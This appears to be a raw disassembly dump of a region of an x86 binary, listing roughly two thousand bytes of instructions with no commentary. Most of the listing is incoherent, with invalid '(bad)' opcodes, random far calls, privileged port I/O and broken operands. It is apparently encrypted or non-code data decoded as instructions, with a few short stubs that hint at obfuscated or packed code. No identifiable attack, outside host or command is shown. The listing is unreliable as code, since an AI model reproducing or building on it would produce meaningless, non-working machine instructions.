  4167ac:	js     0x416750
  4167ae:	xchg   esi,eax
  4167af:	mov    ebx,0x70e87a6e
  4167b4:	xor    eax,0x26a27e57
  4167b9:	inc    ecx
  4167ba:	add    edx,ebx
  4167bc:	add    al,0x25
  4167be:	ror    BYTE PTR [edx+0x4f00cf70],0x13
  4167c5:	and    eax,DWORD PTR [edi]
  4167c7:	and    ecx,DWORD PTR [esi+0x6e5a84de]
  4167cd:	dec    eax
  4167ce:	push   esp
  4167cf:	repnz bound eax,QWORD PTR [edi-0xb]
  4167d3:	xor    BYTE PTR [ecx+0x1105533a],0x8e
  4167da:	neg    DWORD PTR [edx]
  4167dc:	pop    ecx
  4167dd:	(bad)  
  4167de:	aad    0x7b
  4167e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e1:	adc    ah,0xe
  4167e4:	(bad)
  4167e8:	out    0xcb,eax
  4167ea:	cli    
  4167eb:	lods   eax,DWORD PTR ds:[esi]
  4167ec:	and    eax,0x3523c90
  4167f1:	jp     0x41680e
  4167f3:	in     al,0xa8
  4167f5:	jg     0x416865
  4167f7:	lahf   
  4167f8:	or     al,0xf3
  4167fa:	sahf   
  4167fb:	push   ebx
  4167fc:	mov    DWORD PTR cs:[ecx],eax
  4167ff:	mov    eax,DWORD PTR [ebp-0x8]
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	mov    edi,0x23769a58
  41681e:	jg     0x416898
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x4167f4
  416825:	jmp    0xabfb:0xafa0c325
  41682c:	pop    ebx
  41682d:	lods   al,BYTE PTR ds:[esi]
  41682e:	call   0xb7dd0bf2
  416833:	xor    eax,0x62d31275
  416838:	ins    DWORD PTR es:[edi],dx
  416839:	cmp    cl,0x7f
  41683c:	jns    0x41689c
  41683e:	jp     0x4167e6
  416840:	adc    al,0x3c
  416842:	loopne 0x41689c
  416844:	fbld   TBYTE PTR [ebp-0x1a]
  416847:	inc    eax
  416848:	pop    esi
  416849:	not    BYTE PTR [esi+0x5e]
  41684c:	xor    eax,0x4eb7879a
  416851:	push   edi
  416852:	pushf  
  416853:	test   DWORD PTR [ebp-0x14eeec29],esp
  416859:	outs   dx,BYTE PTR ds:[esi]
  41685a:	add    DWORD PTR [ecx+0x37],esp
  41685d:	jge    0x416872
  41685f:	adc    dh,cl
  416861:	xchg   ebx,eax
  416862:	cdq    
  416863:	enter  0x95b9,0x1c
  416867:	outs   dx,BYTE PTR ds:[esi]
  416868:	std    
  416869:	shl    DWORD PTR [ebp+0x36],0xf0
  41686d:	push   ecx
  41686e:	mov    ah,0xc7
  416870:	loop   0x4168e6
  416872:	or     al,0x38
  416874:	jecxz  0x4168a8
  416876:	test   al,0x59
  416878:	add    esi,DWORD PTR [ecx-0x17286417]
  41687e:	add    DWORD PTR [edi-0x30],esp
  416881:	and    bh,dl
  416883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416884:	push   ebx
  416885:	inc    ebp
  416886:	pushf  
  416887:	pop    esp
  416888:	loope  0x416828
  41688a:	fnstenv [ecx+0x5b3a196]
  416890:	push   edx
  416891:	jle    0x4168fc
  416893:	sbb    ah,BYTE PTR [esp+edi*8+0x7149bafd]
  41689a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41689b:	push   esi
  41689c:	adc    al,0x5d
  41689e:	mov    ds,esi
  4168a0:	inc    ebp
  4168a1:	mul    DWORD PTR [edx+ebp*8]
  4168a4:	(bad)  
  4168a5:	dec    eax
  4168a6:	pop    edi
  4168a7:	add    eax,0x1abfe0e7
  4168ac:	sub    ch,BYTE PTR [eax-0x80]
  4168af:	aad    0xc5
  4168b1:	cmp    DWORD PTR [ebp-0x47],edx
  4168b4:	fimul  WORD PTR [ecx]
  4168b6:	add    al,0x50
  4168b8:	(bad)  
  4168b9:	mov    edi,0x2b0a84a9
  4168be:	imul   edi,edx,0x5f3dea4
  4168c4:	cmp    eax,0xe4dd9f6c
  4168c9:	ror    bh,0x24
  4168cc:	add    eax,0x71c713b8
  4168d1:	leave  
  4168d2:	popa   
  4168d3:	sub    eax,0x911e6d0b
  4168d8:	fiadd  DWORD PTR [edi-0x3]
  4168db:	bound  ebp,QWORD PTR [ecx-0x73967c66]
  4168e1:	mov    edi,0xe7738d50
  4168e6:	(bad)  
  4168e7:	mov    ds:0x2f9c9bc5,eax
  4168ec:	fmul   QWORD PTR [ecx-0x41555462]
  4168f2:	js     0x4168e6
  4168f4:	adc    DWORD PTR [esi+0x41],esi
  4168f7:	pop    es
  4168f8:	push   edx
  4168f9:	or     ecx,DWORD PTR [esi-0x5a]
  4168fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168fd:	or     eax,DWORD PTR [ebx-0x2b]
  416900:	inc    ebx
  416901:	xchg   esp,eax
  416902:	adc    edx,ecx
  416904:	out    dx,eax
  416905:	sbb    BYTE PTR [edi-0x3c28c128],ch
  41690b:	fs or  al,0xb3
  41690e:	in     eax,0x34
  416910:	adc    DWORD PTR [esi+ebp*8],edx
  416913:	int    0x2d
  416915:	mov    ebx,0x6a37a32
  41691a:	adc    bl,BYTE PTR [edx+0x26]
  41691d:	or     edx,DWORD PTR [esi]
  41691f:	div    bh
  416921:	inc    ebp
  416922:	pusha  
  416923:	or     edx,edx
  416925:	(bad)  
  416927:	dec    esi
  416928:	and    BYTE PTR [esi+0x4],al
  41692b:	je     0x416989
  41692d:	add    al,0xb3
  41692f:	mov    ebp,0xfd449a56
  416934:	inc    ebp
  416935:	loopne 0x41696b
  416937:	push   es
  416938:	outs   dx,DWORD PTR ds:[esi]
  416939:	push   0xa405dd44
  41693e:	or     BYTE PTR [ecx],cl
  416940:	inc    esp
  416941:	push   ecx
  416942:	xor    al,0x2e
  416944:	call   0x85db:0xd0ea2d4c
  41694b:	or     cl,BYTE PTR [edi+0x59]
  41694e:	test   al,bh
  416950:	or     al,0x94
  416952:	pop    edx
  416953:	push   eax
  416954:	loope  0x4168e8
  416956:	dec    edx
  416957:	fidiv  DWORD PTR [esi+ecx*8-0x75b4eb8f]
  41695e:	mov    DWORD PTR [edx-0x6b],ebp
  416961:	fsubr  QWORD PTR ds:0x4ebf2a71
  416967:	ins    DWORD PTR es:[edi],dx
  416968:	adc    al,0xc1
  41696a:	mov    esp,0x7430b07a
  41696f:	loop   0x4169d5
  416971:	into   
  416972:	ins    DWORD PTR es:[edi],dx
  416973:	jmp    0x41690e
  416975:	(bad)  
  416976:	push   edx
  416977:	jb     0x4168fd
  416979:	pop    ds
  41697a:	add    dh,BYTE PTR [esi-0x70]
  41697d:	and    eax,edx
  41697f:	jmp    0x4169b9
  416981:	mov    eax,0x3f72430f
  416986:	lds    eax,FWORD PTR [ebp-0x1c]
  416989:	shl    DWORD PTR [esi-0x16b96889],cl
  41698f:	mov    ebx,0x949723f0
  416994:	and    al,0x3d
  416996:	mov    dh,0xf8
  416998:	mov    al,BYTE PTR gs:[edx+0x69]
  41699c:	loopne 0x41691f
  41699e:	test   eax,0xe91780fb
  4169a3:	test   dl,dh
  4169a5:	push   edi
  4169a6:	push   0xa319e364
  4169ab:	sub    DWORD PTR [ebp-0x25],esp
  4169ae:	cmp    DWORD PTR [eax-0x5f],esi
  4169b1:	call   0xa61f2162
  4169b6:	mov    esi,DWORD PTR [ebx]
  4169b8:	sbb    DWORD PTR [esp+edi*4-0x63],0xffffff85
  4169bd:	cwde   
  4169be:	adc    ecx,ebp
  4169c0:	dec    esp
  4169c1:	mov    esi,0xabaa3284
  4169c6:	xor    cl,BYTE PTR [ebp+eiz*4-0x1d]
  4169ca:	and    ecx,edx
  4169cc:	mov    edx,0x82aaf1c2
  4169d1:	sbb    eax,esp
  4169d3:	iret   
  4169d4:	dec    ebx
  4169d5:	add    esp,edi
  4169d7:	jp     0x416992
  4169d9:	cwde   
  4169da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169db:	pop    ebx
  4169dc:	sbb    al,ah
  4169de:	mov    ch,0x9e
  4169e0:	bound  esp,QWORD PTR [eax]
  4169e2:	test   BYTE PTR [ebx+0x7dd3f6a2],bl
  4169e8:	jno    0x4169fa
  4169ea:	push   ss
  4169eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169ec:	add    eax,DWORD PTR [esi-0x4c]
  4169ef:	push   esp
  4169f0:	out    dx,eax
  4169f1:	hlt    
  4169f2:	cli    
  4169f3:	push   esi
  4169f4:	ss call 0xad3e:0x7a50c5bf
  4169fc:	mul    DWORD PTR [ebx+0x2d]
  4169ff:	add    al,0x3f
  416a01:	test   al,al
  416a03:	xchg   esp,eax
  416a04:	dec    ebx
  416a05:	add    eax,0xe7d19685
  416a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a0b:	(bad)  
  416a0c:	aad    0x81
  416a0e:	mov    bl,0xd9
  416a10:	xor    ch,al
  416a12:	mov    al,0x0
  416a14:	pop    eax
  416a15:	std    
  416a16:	jae    0x416a03
  416a18:	push   ebx
  416a19:	mov    BYTE PTR [esi+0x547f08e8],bl
  416a1f:	test   dh,0xdd
  416a22:	mov    dl,0x97
  416a24:	ja     0x416a23
  416a26:	(bad)  
  416a27:	in     eax,dx
  416a28:	sbb    al,0x3a
  416a2a:	push   edx
  416a2b:	sbb    BYTE PTR [edi],ah
  416a2d:	mov    bl,0x19
  416a2f:	adc    al,0x4c
  416a31:	jo     0x4169b5
  416a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a34:	lds    esi,FWORD PTR [ebx+0x2748571e]
  416a3a:	call   0x91e8:0x92fa4447
  416a41:	fcom   QWORD PTR ds:0x993b9e85
  416a47:	call   0x5f4:0x38af1975
  416a4e:	mul    DWORD PTR [eax]
  416a50:	enter  0x743e,0xd1
  416a54:	fs xchg ebp,eax
  416a56:	inc    ebx
  416a57:	mov    ds:0x5b37e9de,eax
  416a5c:	and    al,0xae
  416a5e:	mov    ah,0xe3
  416a60:	pop    ss
  416a61:	jb     0x416a83
  416a63:	ret    
  416a64:	sbb    BYTE PTR [eax+ecx*2+0x7ad14c70],ch
  416a6b:	pop    ebx
  416a6c:	jb     0x416a58
  416a6e:	xchg   esi,eax
  416a6f:	push   eax
  416a70:	inc    DWORD PTR [ebp+esi*1-0x44]
  416a74:	mov    cl,0x5d
  416a76:	push   esp
  416a77:	mov    ah,0x3
  416a79:	push   es
  416a7a:	xchg   ebp,eax
  416a7b:	mov    edx,DWORD PTR [edi+0x7d]
  416a7e:	or     DWORD PTR [ecx+0x69],eax
  416a81:	call   0x85125b34
  416a86:	sbb    al,0xb5
  416a88:	and    ebx,DWORD PTR [edx]
  416a8a:	xchg   ebx,eax
  416a8b:	pushf  
  416a8c:	mov    al,0xd9
  416a8e:	pushf  
  416a8f:	shr    DWORD PTR [eax+0x63],cl
  416a92:	call   0x2b1:0xe9ba9f6c
  416a99:	sub    al,0xd0
  416a9b:	or     esi,DWORD PTR [esi+0x10c9eae]
  416aa1:	xchg   ebx,eax
  416aa2:	out    0xe3,al
  416aa4:	cmovno esp,eax
  416aa7:	sbb    cl,BYTE PTR [ebp-0x78]
  416aaa:	mov    ds:0x7f18120f,al
  416aaf:	cdq    
  416ab0:	push   ds
  416ab1:	(bad)  
  416ab2:	retf   0x659b
  416ab5:	in     al,dx
  416ab6:	ds pop ecx
  416ab8:	pop    eax
  416ab9:	lods   eax,DWORD PTR ds:[esi]
  416aba:	inc    edx
  416abb:	inc    ecx
  416abc:	mov    bh,0x3
  416abe:	out    dx,al
  416abf:	mov    eax,DWORD PTR [ebp-0x4]
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x9164ff75
  416ad4:	in     eax,dx
  416ad5:	mov    ds:0x7f2093e2,al
  416ada:	js     0x416a71
  416adc:	jle    0x416b56
  416ade:	js     0x416b3c
  416ae0:	fcomip st,st(1)
  416ae2:	arpl   WORD PTR [edi],bp
  416ae4:	sar    DWORD PTR [esi+esi*4],1
  416ae7:	in     eax,dx
  416ae8:	jmp    0x416a71
  416aea:	fnstsw WORD PTR [ecx+0xb]
  416aed:	push   esi
  416aee:	lea    eax,[edi]
  416af0:	mov    dh,0x31
  416af2:	add    BYTE PTR [ecx-0x27],ch
  416af5:	xor    al,0x1f
  416af7:	psubq  mm2,mm0
  416afa:	cld    
  416afb:	outs   dx,DWORD PTR ds:[esi]
  416afc:	jle    0x416b09
  416afe:	outs   dx,BYTE PTR ds:[esi]
  416aff:	jbe    0x416b6f
  416b01:	ret    
  416b02:	fwait
  416b03:	pusha  
  416b04:	test   BYTE PTR [eax+0x4487d499],0x13
  416b0b:	xchg   edx,eax
  416b0c:	mov    ah,0x33
  416b0e:	push   ds
  416b0f:	not    DWORD PTR [esi]
  416b11:	fidivr DWORD PTR [edx+eax*2+0x58]
  416b15:	mov    eax,0x4f208eca
  416b1a:	dec    ebx
  416b1b:	into   
  416b1c:	dec    eax
  416b1d:	xor    bh,bl
  416b1f:	scas   eax,DWORD PTR es:[edi]
  416b20:	retf   0x3f2
  416b23:	stc    
  416b24:	in     al,dx
  416b25:	outs   dx,DWORD PTR ds:[esi]
  416b26:	xor    ah,bh
  416b28:	mov    dl,0xe6
  416b2a:	leave  
  416b2b:	push   es
  416b2c:	ds dec edi
  416b2e:	xchg   DWORD PTR [ebp-0x202883f5],ebp
  416b34:	and    eax,0xa45f714b
  416b39:	mov    bh,0xf3
  416b3b:	je     0x416b30
  416b3d:	xor    ecx,eax
  416b3f:	shl    ecx,cl
  416b41:	mov    al,0x37
  416b43:	dec    esi
  416b44:	outs   dx,DWORD PTR ds:[esi]
  416b45:	test   eax,0x16d8c467
  416b4a:	cmp    DWORD PTR [ecx-0x1b],ecx
  416b4d:	fadd   st(6),st
  416b4f:	xchg   edx,eax
  416b50:	test   al,0x65
  416b52:	jns    0x416b2c
  416b54:	push   ebp
  416b55:	and    eax,DWORD PTR [ebp+0x333e16e2]
  416b5b:	inc    ebp
  416b5c:	dec    ebx
  416b5d:	arpl   WORD PTR [ecx+edi*2-0x73b5a0c4],si
  416b64:	jp     0x416b37
  416b66:	je     0x416bd4
  416b68:	cmp    al,0xc5
  416b6a:	pop    ecx
  416b6b:	pusha  
  416b6c:	ret    
  416b6d:	aaa    
  416b6e:	jns    0x416b26
  416b70:	sub    DWORD PTR [esi+0x51],ebp
  416b73:	iret   
  416b74:	lods   al,BYTE PTR ds:[esi]
  416b75:	push   es
  416b76:	ins    DWORD PTR es:[edi],dx
  416b77:	xlat   BYTE PTR ds:[ebx]
  416b78:	pop    eax
  416b79:	popf   
  416b7a:	pop    ss
  416b7b:	mov    eax,0xb9b262c6
  416b80:	test   DWORD PTR [edi+0x3a14c7fd],0x823d45f9
  416b8a:	xchg   ebp,eax
  416b8b:	enter  0x905d,0xb9
  416b8f:	call   DWORD PTR [edx]
  416b91:	pop    ebp
  416b92:	(bad)  [ecx]
  416b94:	mov    al,0xc2
  416b96:	int3   
  416b97:	and    bl,BYTE PTR [esi-0x18925b4a]
  416b9d:	(bad)  
  416b9e:	imul   edi,DWORD PTR [ebx+0x545b7907],0x861640e3
  416ba8:	sti    
  416ba9:	imul   edi,DWORD PTR [edx+0x63781ec5],0xffffffbf
  416bb0:	adc    al,0x4
  416bb2:	mov    ds:0xa290e61a,al
  416bb7:	out    0x2f,eax
  416bb9:	sbb    al,0x47
  416bbb:	xor    eax,0x3d384cf
  416bc0:	into   
  416bc1:	gs adc eax,0xc172e005
  416bc7:	xor    BYTE PTR [ecx],0xb0
  416bca:	je     0x416c1d
  416bcc:	pushf  
  416bcd:	mov    dh,0x36
  416bcf:	mov    edi,0x9017502c
  416bd4:	pop    ds
  416bd5:	pusha  
  416bd6:	sbb    eax,0x6de6e7d1
  416bdb:	inc    esp
  416bdc:	lods   al,BYTE PTR ds:[esi]
  416bdd:	mov    cs,WORD PTR [ecx-0x3eefc94f]
  416be3:	xor    al,0xb7
  416be5:	jmp    DWORD PTR [esi+0x76701a27]
  416beb:	adc    BYTE PTR ss:[ecx+ebx*2-0x57],cl
  416bf0:	adc    BYTE PTR [esi+0x25],ch
  416bf3:	dec    edi
  416bf4:	cli    
  416bf5:	jg     0x416bd1
  416bf7:	sbb    BYTE PTR [ecx+0x26595907],al
  416bfd:	ficom  WORD PTR [ecx]
  416bff:	xchg   edx,eax
  416c00:	xchg   esi,eax
  416c01:	les    ebx,FWORD PTR [esi+0x2dba8c23]
  416c07:	int    0x5f
  416c09:	cmp    BYTE PTR [edx-0x44],ah
  416c0c:	inc    ecx
  416c0d:	push   0xffffff92
  416c0f:	nop
  416c10:	mov    esi,0x1ec286e
  416c15:	inc    esp
  416c16:	jnp    0x416bf9
  416c18:	cmp    al,0xe7
  416c1a:	dec    edi
  416c1b:	and    edi,ebx
  416c1d:	mov    bl,0x9d
  416c1f:	cdq    
  416c20:	jns    0x416c84
  416c22:	dec    edi
  416c23:	call   0x68c26144
  416c28:	fld    st(1)
  416c2a:	cmp    al,0x79
  416c2c:	pop    esp
  416c2d:	js     0x416c97
  416c2f:	xchg   ecx,eax
  416c30:	mov    ebp,0x25fea6b6
  416c35:	imul   ecx,DWORD PTR [ecx+0x7c],0xffffffca
  416c39:	pop    ebx
  416c3a:	pop    edi
  416c3b:	sbb    eax,0x21281d81
  416c40:	sti    
  416c41:	sbb    DWORD PTR [ebx+0x40aaac97],ebx
  416c47:	sbb    DWORD PTR [esi],0x67
  416c4a:	(bad)  
  416c4b:	dec    esp
  416c4c:	retf   
  416c4d:	jae    0x416c5b
  416c4f:	xchg   ebp,eax
  416c50:	test   BYTE PTR [ebx-0x31],bh
  416c53:	pop    es
  416c54:	hlt    
  416c55:	xor    dh,BYTE PTR [eax-0x26]
  416c58:	rol    ebp,cl
  416c5a:	icebp  
  416c5b:	cmp    eax,0x74be604f
  416c60:	jmp    FWORD PTR [ebp+0x25]
  416c63:	mov    bh,0x9b
  416c65:	int    0xb8
  416c67:	mov    ebx,0x440352d8
  416c6c:	mov    ?,ecx
  416c6e:	mov    ?,ebx
  416c70:	xchg   esi,eax
  416c71:	push   ebx
  416c72:	sbb    edi,DWORD PTR [eax+esi*2+0x619283b7]
  416c79:	mov    dl,0x8a
  416c7b:	loop   0x416cab
  416c7d:	xchg   esi,eax
  416c7e:	pop    eax
  416c7f:	sbb    dh,BYTE PTR [edi+0x59b611ba]
  416c85:	jae    0x416c53
  416c87:	mov    al,BYTE PTR [esi+eiz*4-0x6746843b]
  416c8e:	int3   
  416c8f:	out    dx,al
  416c90:	jl     0x416ca9
  416c92:	mov    al,ds:0x2d42dcf4
  416c97:	cmc    
  416c98:	inc    edi
  416c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c9a:	cmp    al,0xd5
  416c9c:	or     DWORD PTR ds:0xdcc87655,esp
  416ca2:	xlat   BYTE PTR ds:[ebx]
  416ca3:	push   es
  416ca4:	push   cs
  416ca5:	stos   BYTE PTR es:[edi],al
  416ca6:	push   ecx
  416ca7:	mov    ah,0xa8
  416ca9:	adc    dh,BYTE PTR [ebp-0x5]
  416cac:	cmp    eax,ecx
  416cae:	jle    0x416c4f
  416cb0:	cmp    eax,DWORD PTR [ecx]
  416cb2:	sbb    al,0x33
  416cb4:	jno    0x416c4d
  416cb6:	push   ebp
  416cb7:	add    eax,DWORD PTR [esi-0x4535324b]
  416cbd:	inc    ebx
  416cbe:	or     DWORD PTR [eax],edi
  416cc0:	or     eax,0x23bc2ece
  416cc5:	mov    ah,0x51
  416cc7:	les    esp,FWORD PTR [edi-0x7d14fef5]
  416ccd:	mov    ebp,0x2746f02b
  416cd2:	xchg   edx,eax
  416cd3:	scas   eax,DWORD PTR es:[edi]
  416cd4:	and    ah,dl
  416cd6:	enter  0x6757,0xae
  416cda:	sub    eax,0x81184fc
  416cdf:	enter  0xfbea,0x18
  416ce3:	or     eax,0xd1b101a5
  416ce8:	ins    BYTE PTR es:[edi],dx
  416ce9:	rcl    BYTE PTR [esi+0x79c12614],cl
  416cef:	loope  0x416d51
  416cf1:	cmp    BYTE PTR [ebx-0x3b4a7681],al
  416cf7:	lods   eax,DWORD PTR ds:[esi]
  416cf8:	ret    
  416cf9:	or     ecx,esi
  416cfb:	rcr    ah,1
  416cfd:	xor    ch,ah
  416cff:	jne    0x416d23
  416d01:	pop    ss
  416d02:	idiv   eax
  416d04:	mov    esp,DWORD PTR [ecx+0x65]
  416d07:	nop
  416d08:	add    DWORD PTR gs:[ebx],edx
  416d0b:	ds or  al,0x16
  416d0e:	xchg   BYTE PTR [edi-0x68],al
  416d11:	pushf  
  416d12:	pop    ds
  416d13:	or     BYTE PTR [eax-0x3a179b04],0xfb
  416d1a:	cmp    DWORD PTR [eax+0x7d],esi
  416d1d:	xor    ecx,0xffffffe4
  416d20:	cld    
  416d21:	sbb    BYTE PTR [edx],dh
  416d23:	retf   
  416d24:	(bad)  
  416d25:	sar    ecx,cl
  416d27:	jbe    0x416ce8
  416d29:	iret   
  416d2a:	ss sbb eax,0xdddda916
  416d30:	adc    eax,0xefe87e7a
  416d35:	jg     0x416d1d
  416d37:	and    eax,0x333643c7
  416d3c:	adc    dh,al
  416d3e:	ja     0x416cd9
  416d40:	retf   0x7e70
  416d43:	pusha  
  416d44:	sbb    eax,0x3f308e3f
  416d49:	test   al,0xec
  416d4b:	int3   
  416d4c:	(bad)  
  416d4d:	mov    esp,DWORD PTR [esi-0x1bd165e7]
  416d53:	mov    al,ds:0x4d890677
  416d58:	mov    ch,0xd9
  416d5a:	xchg   esi,eax
  416d5b:	rcl    ah,0x6b
  416d5e:	stos   BYTE PTR es:[edi],al
  416d5f:	nop
  416d60:	adc    al,ch
  416d62:	and    al,0xdd
  416d64:	inc    edi
  416d65:	stc    
  416d66:	in     eax,0x89
  416d68:	mov    al,0x37
  416d6a:	jecxz  0x416dcd
  416d6c:	aaa    
  416d6d:	(bad)  
  416d6f:	call   0xa4f0c70d
  416d74:	jnp    0x416d5c
  416d76:	jns    0x416d7f
  416d78:	adc    ah,BYTE PTR [ebx-0x75]
  416d7b:	dec    ebp
  416d7c:	adc    BYTE PTR [ebx],dh
  416d7e:	mov    DWORD PTR [ebx],0xfc13bc6
  416d84:	test   DWORD PTR [ebx-0x74fffffb],edx
  416d8a:	inc    ebp
  416d8b:	cld    
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0x9d8b:0x65ef1efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	inc    di
  416db9:	jns    0x416dbd
  416dbb:	out    0x93,eax
  416dbd:	jnp    0x416e39
  416dbf:	mov    eax,ds:0x6171563c
  416dc4:	test   BYTE PTR [eax+0x4f3c6e37],0x7e
  416dcb:	sub    DWORD PTR [esi+ebp*1+0x58],ecx
  416dcf:	xchg   BYTE PTR [ebp+0x5a],bh
  416dd2:	adc    ecx,DWORD PTR [edi-0x41]
  416dd5:	cwde   
  416dd6:	and    BYTE PTR ds:0x4f40d1ad,0x5d
  416ddd:	jl     0x416da8
  416ddf:	outs   dx,BYTE PTR ds:[esi]
  416de0:	call   0x4fb5:0x5d973cbd
  416de7:	mov    esp,0x225e92b3
  416dec:	loopne 0x416dcc
  416dee:	add    DWORD PTR [ebx],0x5782b8b2
  416df4:	cmp    DWORD PTR [ecx*1+0x450b18de],esi
  416dfb:	pop    esp
  416dfc:	mov    ?,WORD PTR [edx-0x14]
  416dff:	inc    edx
  416e00:	add    DWORD PTR [ecx],0x21
  416e03:	lock or dl,al
  416e06:	sub    esp,DWORD PTR [esi-0x5e450f27]
  416e0c:	and    eax,0x5130d821
  416e11:	push   ebp
  416e12:	(bad)  
  416e13:	jae    0x416ddf
  416e15:	repnz mov dl,0xe2
  416e18:	sbb    BYTE PTR [eax],0xda
  416e1b:	xchg   esi,esp
  416e1d:	add    al,0xbf
  416e1f:	xchg   DWORD PTR ds:0x8739352a,esp
  416e25:	arpl   WORD PTR [esp+esi*4+0x7b5ea6a4],bx
  416e2c:	(bad)
  416e2f:	sbb    eax,0xa4a34197
  416e34:	mov    eax,0xe89b7551
  416e39:	dec    ebx
  416e3a:	icebp  
  416e3b:	jne    0x416e8e
  416e3d:	xchg   esi,eax
  416e3e:	mov    dl,0x3d
  416e40:	inc    BYTE PTR [eax]
  416e42:	sbb    eax,0x77b2ed8f
  416e47:	push   ss
  416e48:	mov    BYTE PTR [edx-0x73f28ed1],cl
  416e4e:	outs   dx,BYTE PTR ds:[esi]
  416e4f:	sub    dh,0xcf
  416e52:	in     eax,0x1f
  416e54:	xor    cl,BYTE PTR [ebx]
  416e56:	lea    ecx,[ecx+edx*1-0xb99e113]
  416e5d:	pop    ds
  416e5e:	mov    dl,0x2c
  416e60:	and    DWORD PTR [edx],ebp
  416e62:	pop    esp
  416e63:	stc    
  416e64:	std    
  416e65:	loopne 0x416dea
  416e67:	aaa    
  416e68:	inc    esp
  416e69:	(bad)  
  416e6a:	ins    DWORD PTR es:[edi],dx
  416e6b:	sahf   
  416e6c:	fcom   st(4)
  416e6e:	jg     0x416df8
  416e70:	inc    BYTE PTR [eax+0x1a4feafb]
  416e76:	push   ebx
  416e77:	sub    edx,edx
  416e79:	rol    BYTE PTR [edx],cl
  416e7b:	nop
  416e7c:	adc    al,0x8
  416e7e:	jp     0x416e42
  416e80:	xor    al,0xd6
  416e82:	push   edi
  416e83:	push   DWORD PTR gs:[esi-0x6dd4a66]
  416e8a:	ja     0x416e69
  416e8c:	dec    ecx
  416e8d:	addr16 adc al,0xfc
  416e90:	mov    ecx,0xf4d3ff06
  416e95:	lahf   
  416e96:	push   DWORD PTR [eax+0x6e802db8]
  416e9c:	dec    esp
  416e9d:	jns    0x416ede
  416e9f:	push   es
  416ea0:	dec    ebx
  416ea1:	pop    edi
  416ea2:	retf   
  416ea3:	imul   edx,DWORD PTR [ebx-0x13edc75d],0xa7db20bf
  416ead:	sub    ch,BYTE PTR [eax-0x4b17157d]
  416eb3:	lock pop eax
  416eb5:	int3   
  416eb6:	mov    ds:0xb4c76cae,al
  416ebb:	adc    al,0x1
  416ebd:	imul   ecx,DWORD PTR [ebp+0x2f],0x19c3ad53
  416ec4:	inc    esp
  416ec5:	das    
  416ec6:	xor    dl,0x8f
  416ec9:	pop    esi
  416eca:	add    BYTE PTR [esi+0x728d043b],dh
  416ed0:	or     ecx,DWORD PTR [ecx]
  416ed2:	outs   dx,DWORD PTR ds:[esi]
  416ed3:	jl     0x416eb7
  416ed5:	or     dh,bl
  416ed7:	adc    BYTE PTR [eax+0x56],bh
  416eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416edb:	(bad)  
  416edd:	push   cs
  416ede:	fild   WORD PTR [ebp+0x2a]
  416ee1:	add    ecx,DWORD PTR [edi]
  416ee3:	adc    eax,0xc2e42f9b
  416ee8:	sub    bl,BYTE PTR [edi+0x7e41ac0a]
  416eee:	add    DWORD PTR [ecx-0x4dbc5865],ecx
  416ef4:	(bad)  
  416ef5:	icebp  
  416ef6:	outs   dx,DWORD PTR ds:[esi]
  416ef7:	aas    
  416ef8:	retf   
  416ef9:	cmp    ebx,esi
  416efb:	xchg   edi,eax
  416efc:	fs and esp,eax
  416eff:	leave  
  416f00:	cmp    edx,edx
  416f02:	rcr    DWORD PTR [ecx-0x1fbbca17],cl
  416f08:	mov    edi,0x71342e50
  416f0d:	pop    es
  416f0e:	jle    0x416f3b
  416f10:	cwde   
  416f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f12:	mov    al,ds:0xa375aa7
  416f17:	add    ch,BYTE PTR [esi]
  416f19:	aam    0xd9
  416f1b:	xchg   ebx,eax
  416f1c:	adc    al,BYTE PTR [esi+0x18]
  416f1f:	(bad)  
  416f20:	dec    ecx
  416f21:	aad    0xce
  416f23:	je     0x416f1a
  416f25:	in     eax,0xb4
  416f27:	xchg   esi,eax
  416f28:	dec    edx
  416f29:	push   esi
  416f2a:	je     0x416f17
  416f2c:	jle    0x416f4a
  416f2e:	add    al,0xe9
  416f30:	jecxz  0x416edc
  416f32:	add    BYTE PTR [ebp-0x682de929],dl
  416f38:	xor    edi,edx
  416f3a:	mul    DWORD PTR [edx]
  416f3c:	jl     0x416f5f
  416f3e:	pop    ebp
  416f3f:	mov    al,0xaf
  416f41:	popf   
  416f42:	dec    ebx
  416f43:	arpl   WORD PTR [ebx],bx
  416f45:	lock jo 0x416fb3
  416f48:	outs   dx,BYTE PTR ds:[esi]
  416f49:	mov    esi,0xf2f9aa4b
  416f4e:	(bad)  
  416f4f:	in     eax,0x6b
  416f51:	jne    0x416f3a
  416f53:	mov    dh,0x50
  416f55:	dec    ecx
  416f56:	fst    QWORD PTR [ecx]
  416f58:	fxtract 
  416f5a:	cpuid  
  416f5c:	clc    
  416f5d:	idiv   DWORD PTR [ecx+0x41]
  416f60:	mov    DWORD PTR [ebx],0x6611deee
  416f66:	mov    WORD PTR [ebx+ecx*2+0x535a10d2],?
  416f6d:	xor    DWORD PTR [edi-0x6a36086e],ebp
  416f73:	xchg   esi,eax
  416f74:	cli    
